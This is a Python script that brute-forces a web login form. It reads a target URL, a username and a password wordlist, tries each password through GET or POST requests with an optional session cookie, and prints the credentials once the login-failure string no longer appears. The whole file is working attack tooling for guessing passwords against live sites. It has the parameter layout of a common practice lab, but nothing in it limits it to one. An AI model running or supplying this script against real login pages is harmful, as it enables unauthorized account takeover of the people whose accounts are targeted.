import requests
from termcolor import colored

url = input("[+] Enter the URL: ")
username = input("[+] Enter the username for the acc to bruteforce: ")
password_file = input("[+] Enter the path to the password file: ")
login_failed_string = input("[+] Enter the login failed string: ")
cookie_value = input("[+] Enter the cookie value(optional): ")


def cracking(username, url):
    with open(password_file, "r") as passwords:
        for password in passwords:
            password = password.strip()
            attempt_message = (
                f"[+] Attempting to bruteforce {username} with password: {password}"
            )
            print(colored(attempt_message, "red"))

            data = {
                "username": username,
                "password": password,
                "Login": "submit",
            }

            if cookie_value != "":
                response = requests.get(
                    url,
                    params={
                        "username": username,
                        "password": password,
                        "Login": "Login",
                    },
                    cookies={"Cookie": cookie_value},
                )
            else:
                response = requests.post(url, data=data)

            if login_failed_string in response.content.decode():
                pass
            else:
                success_username = colored(f"[+] username found: {username}", "green")
                success_password = colored(f"[+] password found: {password}", "green")
                print(success_username)
                print(success_password)
                exit()


cracking(username, url)

print("[-] No username found!")
print("[-] No password found!")
